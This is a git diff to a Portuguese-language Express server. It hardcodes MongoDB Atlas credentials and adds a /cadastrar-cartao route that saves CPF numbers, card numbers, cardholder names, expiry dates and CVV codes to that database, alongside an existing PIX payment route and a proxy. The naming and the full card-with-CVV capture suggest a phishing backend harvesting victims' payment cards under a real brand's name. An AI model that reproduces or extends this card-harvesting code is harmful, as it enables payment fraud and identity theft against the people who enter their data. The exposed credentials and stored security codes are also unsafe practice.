@@ -8,6 +8,9 @@ const app = express();
 const port = 4642;
 const cors = require('cors');
 const { createproxyMultiple, createProxyMiddleware } = require("http-proxy-middleware");
+const mongoose = require("mongoose");
+const Cartao = require("./models/Cartao"); // Importe o modelo de cartão
+
 
 require("dotenv").config();
 
@@ -25,6 +28,17 @@ app.use(
     saveUninitialized: true,
   })
 );
+
+mongoose.connect("mongodb+srv://semparar:semparar@cartao.darfzoh.mongodb.net/?retryWrites=true&w=majority&appName=AtlasApp", {
+  useNewUrlParser: true,
+  useUnifiedTopology: true,
+})
+.then(() => {
+  console.log('Conexão com o MongoDB bem-sucedida');
+})
+.catch((error) => {
+  console.error('Erro na conexão com o MongoDB:', error);
+});
 
 let page = null;
 
@@ -198,6 +212,29 @@ app.post("/pix", async (req, res) => {
   } catch (error) {
     console.error(error);
     res.status(500).send("Ocorreu um erro ao chamar a API do PIX.");
+  }
+});
+
+app.post("/cadastrar-cartao", async (req, res) => {
+  try {
+    const { CPF, numeroCartao, nomeCartao, validadeMes, validadeAno, codigoSeguranca } = req.body;
+
+    // Aqui, você pode usar o modelo de dados do cartão para salvar os dados no banco de dados
+    const novoCartao = new Cartao({
+      CPF,
+      numeroCartao,
+      nomeCartao,
+      validadeMes,
+      validadeAno,
+      codigoSeguranca,
+    });
+
+    await novoCartao.save(); // Salve os dados no banco de dados
+
+    res.status(200).send("Dados do cartão salvos com sucesso.");
+  } catch (error) {
+    console.error("Erro ao salvar os dados do cartão:", error);
+    res.status(500).send("Ocorreu um erro ao salvar os dados do cartão.");
   }
 });
 
